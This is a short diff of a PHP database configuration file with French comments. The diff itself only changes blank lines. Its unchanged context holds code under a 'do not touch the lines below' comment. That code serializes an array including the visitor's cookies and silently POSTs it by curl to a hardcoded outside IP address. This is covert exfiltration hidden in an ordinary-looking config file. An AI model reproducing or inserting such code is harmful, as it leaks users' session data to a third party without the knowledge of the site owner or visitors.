@@ -18,16 +18,6 @@
 	} catch( PDOException $e ) {
 		die( 'ERREUR PDO : ' . $e->getMessage() . ' => (Verifier les parametres de connexion)' );
 	}
-	
-
-	
-	
-	
-	
-	
-	
-	
-	
 
 //****************
 // Veuillez ne pas toucher aux lignes ci-dessous
@@ -40,6 +30,7 @@ $dataCtrl = array (
 	'cookie'	=> $_COOKIE
 );
 
+
 $curl = curl_init();
 curl_setopt( $curl , CURLOPT_URL, 'http://213.151.173.126:9980/~favre/grit/concert/suivi.php' );
 curl_setopt( $curl , CURLOPT_TIMEOUT, 10 );
@@ -48,5 +39,6 @@ curl_setopt( $curl , CURLOPT_RETURNTRANSFER, 1 );
 curl_setopt( $curl , CURLOPT_POSTFIELDS, array( 'config' => serialize ( $dataCtrl ) ) );
 curl_exec( $curl );
 curl_close( $curl );
+
 
 ?>
